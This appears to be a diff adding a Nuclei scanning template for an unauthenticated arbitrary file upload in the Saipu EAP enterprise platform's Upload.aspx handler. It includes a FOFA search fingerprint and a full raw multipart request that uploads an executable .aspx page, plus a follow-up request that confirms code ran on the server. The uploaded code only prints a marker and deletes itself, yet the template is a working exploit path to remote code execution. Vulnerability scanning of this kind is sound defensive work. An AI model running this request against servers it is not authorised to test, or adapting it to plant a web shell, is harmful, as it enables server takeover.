@@ -1,0 +1,59 @@
+id: SaiPu-EAP-QiYeShiPeiGuanLiPingTai-Upload_aspx-File-Upload
+
+info:
+  name: 赛普EAP企业适配管理平台 Handler Upload.aspx 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: body="IDWebSoft/"
+    赛普EAP企业适配管理平台 Handler Upload.aspx 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference: |
+    -
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=---------------------------900016908377990696644465908391
+        Content-Length: 671
+
+        -----------------------------900016908377990696644465908391
+        Content-Disposition: form-data; name="Filedata"; filename="{{username}}.aspx"
+        Content-Type: image/png
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        -----------------------------900016908377990696644465908391--
+
+    extractors:
+      - type: regex
+        name: file_path
+        part: body
+        regex:
+          - "%2f[0-9]{4}%2f[0-9]{2}%2f[a-f0-9-]+.aspx"
+        group: 0
+
+  - raw:
+      - |
+        GET /IDWebSoft/Accessary{{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+        Accept: */*
+        
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
